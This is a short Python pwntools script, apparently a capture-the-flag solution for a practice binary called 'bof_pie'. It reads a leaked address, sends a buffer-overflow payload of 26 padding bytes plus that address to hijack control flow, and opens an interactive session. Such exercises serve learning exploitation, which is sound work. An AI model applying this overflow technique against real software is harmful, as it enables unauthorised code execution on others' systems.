from pwn import *

p = process("./bof_pie")
e = ELF("./bof_pie")

p.recvuntil("j0n9hyun is ")
addr = p.recv(1024)

print(addr)
print(str(p32(int(addr,16))))


payload =  ""
payload += "A" * 26 
payload += p32(int(addr,16))

log.info("payload : " + payload)
p.sendline(payload)

sleep(0.5)
p.interactive()
